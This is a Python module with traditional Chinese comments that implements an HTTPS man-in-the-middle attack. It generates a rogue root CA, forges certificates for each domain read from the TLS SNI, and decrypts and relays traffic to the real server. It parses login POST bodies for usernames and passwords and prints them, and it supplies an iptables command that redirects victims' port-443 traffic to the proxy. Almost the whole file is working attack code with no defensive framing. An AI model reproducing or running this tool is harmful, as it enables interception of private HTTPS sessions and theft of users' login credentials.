#!/usr/bin/env python3
"""
SSL/TLS中間人攻擊模組
使用自簽名CA證書來攔截和解密HTTPS流量
"""

import socket
import ssl
import threading
import time
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from datetime import datetime, timedelta
import os
import json

class SSLMitm:
    def __init__(self, ca_cert_path="ca_cert.pem", ca_key_path="ca_key.pem", port=8443):
        """
        初始化SSL中間人攻擊器
        
        Args:
            ca_cert_path: CA證書路徑
            ca_key_path: CA私鑰路徑
            port: 監聽端口
        """
        self.ca_cert_path = ca_cert_path
        self.ca_key_path = ca_key_path
        self.port = port
        self.running = False
        self.server_socket = None
        self.captured_credentials = []
        self.cert_cache = {}  # 緩存生成的證書
        
        # 載入或創建CA證書
        self.ca_cert, self.ca_key = self._load_or_create_ca()
        
    def _load_or_create_ca(self):
        """載入現有的CA證書或創建新的"""
        if os.path.exists(self.ca_cert_path) and os.path.exists(self.ca_key_path):
            print(f"[*] 載入現有CA證書: {self.ca_cert_path}")
            try:
                with open(self.ca_cert_path, 'rb') as f:
                    ca_cert = x509.load_pem_x509_certificate(f.read())
                with open(self.ca_key_path, 'rb') as f:
                    ca_key = serialization.load_pem_private_key(f.read(), password=None)
                print("[+] CA證書載入成功")
                return ca_cert, ca_key
            except Exception as e:
                print(f"[!] 載入CA證書失敗: {e}")
                print("[*] 將創建新的CA證書")
        
        print("[*] 創建新的CA證書...")
        return self._create_ca()
    
    def _create_ca(self):
        """創建自簽名CA證書"""
        # 生成私鑰
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048
        )
        
        # 創建證書
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "TW"),
            x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "Taiwan"),
            x509.NameAttribute(NameOID.LOCALITY_NAME, "Taipei"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "MITM Proxy CA"),
            x509.NameAttribute(NameOID.COMMON_NAME, "MITM Proxy Root CA"),
        ])
        
        cert = x509.CertificateBuilder().subject_name(
            subject
        ).issuer_name(
            issuer
        ).public_key(
            private_key.public_key()
        ).serial_number(
            x509.random_serial_number()
        ).not_valid_before(
            datetime.utcnow()
        ).not_valid_after(
            datetime.utcnow() + timedelta(days=3650)  # 10年有效期
        ).add_extension(
            x509.BasicConstraints(ca=True, path_length=None),
            critical=True,
        ).add_extension(
            x509.KeyUsage(
                digital_signature=True,
                content_commitment=False,
                key_encipherment=True,
                data_encipherment=False,
                key_agreement=False,
                key_cert_sign=True,
                crl_sign=True,
                encipher_only=False,
                decipher_only=False,
            ),
            critical=True,
        ).sign(private_key, hashes.SHA256())
        
        # 保存證書和私鑰
        with open(self.ca_cert_path, 'wb') as f:
            f.write(cert.public_bytes(serialization.Encoding.PEM))
        
        with open(self.ca_key_path, 'wb') as f:
            f.write(private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            ))
        
        print(f"[+] CA證書已創建: {self.ca_cert_path}")
        print(f"[+] CA私鑰已創建: {self.ca_key_path}")
        print("[*] 請將CA證書安裝到目標系統的信任證書存儲中")
        
        return cert, private_key
    
    def _generate_certificate_for_domain(self, domain):
        """為指定域名生成證書"""
        if domain in self.cert_cache:
            return self.cert_cache[domain]
        
        print(f"[*] 為域名 {domain} 生成證書...")
        
        # 生成私鑰
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048
        )
        
        # 創建證書
        subject = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "TW"),
            x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "Taiwan"),
            x509.NameAttribute(NameOID.LOCALITY_NAME, "Taipei"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, domain),
            x509.NameAttribute(NameOID.COMMON_NAME, domain),
        ])
        
        cert = x509.CertificateBuilder().subject_name(
            subject
        ).issuer_name(
            self.ca_cert.subject
        ).public_key(
            private_key.public_key()
        ).serial_number(
            x509.random_serial_number()
        ).not_valid_before(
            datetime.utcnow()
        ).not_valid_after(
            datetime.utcnow() + timedelta(days=365)
        ).add_extension(
            x509.SubjectAlternativeName([
                x509.DNSName(domain),
                x509.DNSName(f"*.{domain}"),  # 支持子域名
            ]),
            critical=False,
        ).sign(self.ca_key, hashes.SHA256())
        
        # 緩存證書和私鑰
        self.cert_cache[domain] = (cert, private_key)
        
        return cert, private_key
    
    def _read_full_tls_record(self, sock, buffer=b''):
        """讀取完整的TLS記錄，處理分片情況"""
        data = buffer
        max_attempts = 10
        attempt = 0
        
        while attempt < max_attempts:
            # 檢查是否有足夠的數據來讀取記錄頭（5字節）
            if len(data) < 5:
                try:
                    sock.settimeout(1.0)
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                except socket.timeout:
                    if len(data) >= 5:
                        break  # 有部分數據，嘗試解析
                    return None, b''
                except:
                    return None, b''
            
            # 解析TLS記錄頭
            record_type = data[0]
            version = (data[1] << 8) | data[2]
            record_length = (data[3] << 8) | data[4]
            
            # 檢查記錄長度是否合理（最大16KB）
            if record_length > 16384:
                return None, b''
            
            # 檢查是否有完整的記錄
            total_length = 5 + record_length
            if len(data) < total_length:
                # 需要讀取更多數據
                try:
                    sock.settimeout(1.0)
                    chunk = sock.recv(total_length - len(data))
                    if not chunk:
                        break
                    data += chunk
                except socket.timeout:
                    # 超時，返回現有數據
                    return data[:total_length] if len(data) >= total_length else None, data
                except:
                    return None, b''
            
            # 返回完整的記錄和剩餘數據
            record = data[:total_length]
            remaining = data[total_length:]
            return record, remaining
        
        return None, data
    
    def _extract_sni(self, client_hello):
        """從TLS Client Hello中提取SNI（Server Name Indication）- 改進版本"""
        try:
            if not client_hello or len(client_hello) < 5:
                return None
            
            # 檢查TLS記錄類型（0x16 = Handshake, 0x17 = Application Data）
            record_type = client_hello[0]
            if record_type != 0x16:  # Handshake
                return None
            
            # TLS版本（字節1-2）
            version = (client_hello[1] << 8) | client_hello[2]
            
            # 記錄長度（字節3-4）
            record_length = (client_hello[3] << 8) | client_hello[4]
            
            # 確保有足夠的數據
            if len(client_hello) < 5 + record_length:
                return None  # 數據不完整，需要更多數據
            
            # Handshake消息開始於字節5
            handshake_data = client_hello[5:5+record_length]
            
            if len(handshake_data) < 4:
                return None
            
            # Handshake類型（0x01 = Client Hello）
            handshake_type = handshake_data[0]
            if handshake_type != 0x01:
                return None
            
            # Handshake消息長度（3字節）
            handshake_length = (handshake_data[1] << 16) | (handshake_data[2] << 8) | handshake_data[3]
            
            # 確保handshake數據完整
            if len(handshake_data) < 4 + handshake_length:
                return None
            
            # Client Hello消息開始於字節4
            client_hello_data = handshake_data[4:4+handshake_length]
            
            if len(client_hello_data) < 35:
                return None
            
            # 跳過版本（2字節）
            offset = 2
            
            # 跳過隨機數（32字節）
            offset += 32
            
            # Session ID長度（1字節）
            if len(client_hello_data) < offset + 1:
                return None
            session_id_length = client_hello_data[offset]
            offset += 1
            
            # Session ID（可變長度）
            if len(client_hello_data) < offset + session_id_length:
                return None
            offset += session_id_length
            
            # Cipher Suites長度（2字節）
            if len(client_hello_data) < offset + 2:
                return None
            cipher_suites_length = (client_hello_data[offset] << 8) | client_hello_data[offset + 1]
            offset += 2
            
            # Cipher Suites（可變長度）
            if len(client_hello_data) < offset + cipher_suites_length:
                return None
            offset += cipher_suites_length
            
            # Compression Methods長度（1字節）
            if len(client_hello_data) < offset + 1:
                return None
            compression_methods_length = client_hello_data[offset]
            offset += 1
            
            # Compression Methods（可變長度）
            if len(client_hello_data) < offset + compression_methods_length:
                return None
            offset += compression_methods_length
            
            # 檢查是否有Extensions（TLS 1.2+）
            if len(client_hello_data) < offset + 2:
                return None  # 沒有extensions
            
            # Extensions長度（2字節）
            extensions_length = (client_hello_data[offset] << 8) | client_hello_data[offset + 1]
            offset += 2
            
            # 確保extensions數據完整
            if len(client_hello_data) < offset + extensions_length:
                return None
            
            # 遍歷Extensions
            ext_end = offset + extensions_length
            while offset < ext_end and offset + 4 <= len(client_hello_data):
                # Extension類型（2字節）
                ext_type = (client_hello_data[offset] << 8) | client_hello_data[offset + 1]
                offset += 2
                
                # Extension長度（2字節）
                if offset + 2 > len(client_hello_data) or offset + 2 > ext_end:
                    break
                ext_length = (client_hello_data[offset] << 8) | client_hello_data[offset + 1]
                offset += 2
                
                # SNI extension類型是0
                if ext_type == 0:
                    # Server Name List長度（2字節）
                    if offset + 2 > len(client_hello_data) or offset + 2 > ext_end:
                        break
                    server_name_list_length = (client_hello_data[offset] << 8) | client_hello_data[offset + 1]
                    offset += 2
                    
                    # Server Name條目
                    if offset + 3 > len(client_hello_data) or offset + 3 > ext_end:
                        break
                    name_type = client_hello_data[offset]
                    offset += 1
                    
                    # Name長度（2字節）
                    if offset + 2 > len(client_hello_data) or offset + 2 > ext_end:
                        break
                    name_length = (client_hello_data[offset] << 8) | client_hello_data[offset + 1]
                    offset += 2
                    
                    # Name（host_name類型為0）
                    if name_type == 0 and offset + name_length <= len(client_hello_data) and offset + name_length <= ext_end:
                        server_name = client_hello_data[offset:offset + name_length].decode('utf-8', errors='ignore')
                        if server_name and len(server_name) > 0:
                            return server_name
                    break
                
                # 跳過此extension
                offset += ext_length
            
            return None
        except Exception as e:
            return None
    
    def _handle_client(self, client_socket, client_addr):
        """處理客戶端連接 - 改進版本"""
        host = None
        buffer = b''
        try:
            client_socket.settimeout(10)  # 設置較短的超時時間
            
            # 方法1：使用改進的TLS記錄讀取來提取SNI
            client_hello, buffer = self._read_full_tls_record(client_socket, buffer)
            
            if client_hello:
                host = self._extract_sni(client_hello)
            
            # 方法2：如果方法1失敗，嘗試使用SSL模組的SNI回調（需要重新讀取）
            if not host:
                try:
                    # 創建一個臨時證書用於SNI提取
                    temp_cert, temp_key = self._generate_certificate_for_domain("temp.example.com")
                    cert_pem = temp_cert.public_bytes(serialization.Encoding.PEM)
                    key_pem = temp_key.private_bytes(
                        encoding=serialization.Encoding.PEM,
                        format=serialization.PrivateFormat.PKCS8,
                        encryption_algorithm=serialization.NoEncryption()
                    )
                    
                    import tempfile
                    with tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix='.pem') as cert_file:
                        cert_file.write(cert_pem)
                        temp_cert_path = cert_file.name
                    
                    with tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix='.key') as key_file:
                        key_file.write(key_pem)
                        temp_key_path = key_file.name
                    
                    try:
                        # 創建SSL上下文並設置SNI回調
                        temp_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                        temp_context.load_cert_chain(temp_cert_path, temp_key_path)
                        sni_host = [None]
                        
                        def sni_callback(ssl_sock, server_name, ssl_context):
                            if server_name:
                                sni_host[0] = server_name
                            return None
                        
                        temp_context.set_servername_callback(sni_callback)
                        
                        # 創建一個新的socket來進行SNI提取（因為原socket可能已經讀取了數據）
                        # 但實際上我們無法重新連接，所以這個方法有限制
                        # 改為：如果buffer中有數據，嘗試從中提取
                        if buffer:
                            host = self._extract_sni(buffer)
                        
                        try:
                            os.unlink(temp_cert_path)
                            os.unlink(temp_key_path)
                        except:
                            pass
                    except Exception as e:
                        try:
                            os.unlink(temp_cert_path)
                            os.unlink(temp_key_path)
                        except:
                            pass
                        pass
                except Exception as e:
                    pass
            
            # 方法3：如果前兩種方法都失敗，使用啟發式方法
            if not host:
                try:
                    import re
                    # 在Client Hello中搜索域名模式
                    search_data = client_hello if client_hello else buffer
                    if search_data:
                        client_hello_str = search_data.decode('latin-1', errors='ignore')
                        # 查找常見的頂級域名模式
                        domain_pattern = r'\b([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}\b'
                        matches = re.findall(domain_pattern, client_hello_str)
                        if matches:
                            # 過濾掉明顯不是域名的匹配（如版本號等）
                            for match in matches:
                                potential_host = match[0] if isinstance(match, tuple) else match
                                # 驗證：域名應該在合理長度內，且不包含明顯的無效字符
                                if (3 < len(potential_host) < 255 and 
                                    '.' in potential_host and 
                                    not potential_host.startswith('.') and
                                    not potential_host.endswith('.')):
                                    # 排除一些明顯不是域名的模式
                                    if not re.match(r'^\d+\.\d+\.\d+', potential_host):  # 排除IP地址模式
                                        host = potential_host
                                        print(f"[*] 使用啟發式方法找到域名: {host}")
                                        break
                except Exception as e:
                    pass
            
            if not host:
                print(f"[!] 無法從TLS握手提取SNI，跳過此連接")
                return
            
            # 移除端口號（如果有）
            if ':' in host:
                host = host.split(':')[0]
            
            print(f"[*] 處理連接到: {host}")
            
            # 為該域名生成證書
            cert, private_key = self._generate_certificate_for_domain(host)
            
            # 將證書和私鑰轉換為PEM格式
            cert_pem = cert.public_bytes(serialization.Encoding.PEM)
            key_pem = private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            )
            
            # 創建臨時證書文件
            import tempfile
            with tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix='.pem') as cert_file:
                cert_file.write(cert_pem)
                cert_path = cert_file.name
            
            with tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix='.key') as key_file:
                key_file.write(key_pem)
                key_path = key_file.name
            
            ssl_client = None
            ssl_server = None
            server_socket = None
            
            try:
                # 如果我們已經讀取了Client Hello，需要將數據放回socket
                # 但由於socket不支持"unread"，我們需要創建一個新的socket連接
                # 或者使用一個緩衝的socket包裝器
                
                # 創建一個緩衝的socket包裝器來處理已讀取的數據
                class BufferedSocket:
                    def __init__(self, sock, initial_data):
                        self.sock = sock
                        self.buffer = initial_data
                        self.settimeout = sock.settimeout
                        self.gettimeout = sock.gettimeout
                    
                    def recv(self, bufsize):
                        if self.buffer:
                            data = self.buffer[:bufsize]
                            self.buffer = self.buffer[bufsize:]
                            return data
                        return self.sock.recv(bufsize)
                    
                    def send(self, data):
                        return self.sock.send(data)
                    
                    def close(self):
                        return self.sock.close()
                    
                    def __getattr__(self, name):
                        return getattr(self.sock, name)
                
                # 將已讀取的數據放回緩衝區
                buffered_socket = BufferedSocket(client_socket, client_hello if client_hello else buffer)
                
                # 使用我們的證書與客戶端建立SSL連接
                context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                context.load_cert_chain(cert_path, key_path)
                # 設置較短的超時以避免長時間等待
                context.set_default_verify_paths()
                
                # 將socket包裝為SSL，設置較短的超時
                buffered_socket.settimeout(15)
                try:
                    ssl_client = context.wrap_socket(buffered_socket, server_side=True, do_handshake_on_connect=False)
                    # 執行握手，設置超時
                    ssl_client.settimeout(15)
                    ssl_client.do_handshake()
                except ssl.SSLError as e:
                    if "timed out" in str(e).lower() or "handshake" in str(e).lower():
                        print(f"[!] SSL握手超時或失敗: {e}")
                    raise
                except socket.timeout:
                    print(f"[!] SSL握手超時")
                    raise
                
                # 與真實服務器建立連接
                server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server_socket.settimeout(10)  # 較短的連接超時
                
                try:
                    server_socket.connect((host, 443))
                except socket.gaierror:
                    # DNS解析失敗，嘗試使用IP地址
                    try:
                        ip = socket.gethostbyname(host)
                        server_socket.connect((ip, 443))
                    except Exception as e:
                        print(f"[!] 無法連接到 {host}: {e}")
                        return
                except socket.timeout:
                    print(f"[!] 連接服務器超時: {host}")
                    return
                except Exception as e:
                    print(f"[!] 連接服務器失敗: {host}: {e}")
                    return
                
                # 與真實服務器建立SSL連接
                server_context = ssl.create_default_context()
                server_socket.settimeout(15)
                try:
                    ssl_server = server_context.wrap_socket(server_socket, server_hostname=host)
                except Exception as e:
                    print(f"[!] 與服務器SSL握手失敗: {e}")
                    return
                
                # 在兩個SSL連接之間轉發數據
                def forward_data(source, dest, name, timeout=300):
                    try:
                        source.settimeout(30)  # 設置接收超時
                        start_time = time.time()
                        while time.time() - start_time < timeout:
                            try:
                                data = source.recv(4096)
                                if not data:
                                    break
                                dest.send(data)
                                
                                # 嘗試從解密後的HTTP數據中提取憑證
                                try:
                                    decoded = data.decode('utf-8', errors='ignore')
                                    if 'POST' in decoded and ('password' in decoded.lower() or 'login' in decoded.lower()):
                                        self._extract_credentials(decoded, client_addr)
                                except:
                                    pass
                            except socket.timeout:
                                # 超時，繼續等待
                                continue
                            except (ssl.SSLError, OSError, ConnectionError):
                                # 連接關閉或錯誤
                                break
                    except Exception as e:
                        pass
                
                # 啟動轉發線程
                import threading
                client_to_server = threading.Thread(
                    target=forward_data,
                    args=(ssl_client, ssl_server, "client->server"),
                    daemon=True
                )
                server_to_client = threading.Thread(
                    target=forward_data,
                    args=(ssl_server, ssl_client, "server->client"),
                    daemon=True
                )
                
                client_to_server.start()
                server_to_client.start()
                
                # 等待線程結束
                client_to_server.join(timeout=300)
                server_to_client.join(timeout=300)
                
            finally:
                # 清理資源
                try:
                    if ssl_server:
                        ssl_server.close()
                except:
                    pass
                try:
                    if ssl_client:
                        ssl_client.close()
                except:
                    pass
                try:
                    if server_socket:
                        server_socket.close()
                except:
                    pass
                # 清理臨時文件
                try:
                    os.unlink(cert_path)
                    os.unlink(key_path)
                except:
                    pass
            
        except ssl.SSLError as e:
            # SSL錯誤，可能是客戶端拒絕了我們的證書
            pass
        except Exception as e:
            if "unknown" not in str(e).lower():
                print(f"[!] 處理客戶端錯誤: {e}")
        finally:
            try:
                client_socket.close()
            except:
                pass
    
    def _extract_credentials(self, data, client_addr):
        """從HTTP資料中提取憑證"""
        import urllib.parse
        import re
        
        try:
            # 提取POST body
            if '\r\n\r\n' in data:
                body = data.split('\r\n\r\n', 1)[1]
            else:
                body = data
            
            # 解析URL編碼資料
            try:
                parsed = urllib.parse.parse_qs(body)
                username = None
                password = None
                
                for key in ['user', 'username', 'email', 'login', 'userid', 'account']:
                    if key in parsed:
                        username = parsed[key][0] if parsed[key] else "N/A"
                        break
                
                for key in ['password', 'passwd', 'pass', 'pwd']:
                    if key in parsed:
                        password = parsed[key][0] if parsed[key] else "N/A"
                        break
                
                if username or password:
                    credential = {
                        'username': username or "N/A",
                        'password': password or "N/A",
                        'source_ip': client_addr[0],
                        'timestamp': time.time()
                    }
                    
                    if credential not in self.captured_credentials:
                        self.captured_credentials.append(credential)
                        print(f"[+] 捕獲到憑證: {credential['username']} / {credential['password']} (來源: {credential['source_ip']})")
            except:
                # 使用正則表達式
                username_match = re.search(r'(?:user|username|email|login)=([^&\s\r\n]+)', data, re.IGNORECASE)
                password_match = re.search(r'(?:password|passwd|pass|pwd)=([^&\s\r\n]+)', data, re.IGNORECASE)
                
                if username_match or password_match:
                    username = urllib.parse.unquote(username_match.group(1)) if username_match else "N/A"
                    password = urllib.parse.unquote(password_match.group(1)) if password_match else "N/A"
                    
                    credential = {
                        'username': username,
                        'password': password,
                        'source_ip': client_addr[0],
                        'timestamp': time.time()
                    }
                    
                    if credential not in self.captured_credentials:
                        self.captured_credentials.append(credential)
                        print(f"[+] 捕獲到憑證: {username} / {password} (來源: {credential['source_ip']})")
        except Exception as e:
            pass
    
    def start(self):
        """啟動SSL中間人代理"""
        if self.running:
            return False
        
        try:
            # 創建服務器套接字
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind(('0.0.0.0', self.port))
            self.server_socket.listen(5)
            self.running = True
            
            print(f"[+] SSL中間人代理已啟動 (端口: {self.port})")
            print(f"[*] CA證書位置: {self.ca_cert_path}")
            print(f"[*] 請配置iptables將HTTPS流量重定向到此端口")
            print(f"[*] 命令: sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port {self.port}")
            
            while self.running:
                try:
                    client_socket, client_addr = self.server_socket.accept()
                    # 在新線程中處理客戶端
                    client_thread = threading.Thread(
                        target=self._handle_client,
                        args=(client_socket, client_addr),
                        daemon=True
                    )
                    client_thread.start()
                except Exception as e:
                    if self.running:
                        print(f"[!] 接受連接錯誤: {e}")
        except Exception as e:
            print(f"[!] 啟動SSL中間人代理錯誤: {e}")
            self.running = False
            return False
        
        return True
    
    def stop(self):
        """停止SSL中間人代理"""
        if not self.running:
            return False
        
        self.running = False
        if self.server_socket:
            self.server_socket.close()
        
        print("[+] SSL中間人代理已停止")
        return True
    
    def get_captured_credentials(self):
        """獲取捕獲的憑證"""
        return self.captured_credentials
    
    def get_ca_cert_path(self):
        """獲取CA證書路徑"""
        return self.ca_cert_path

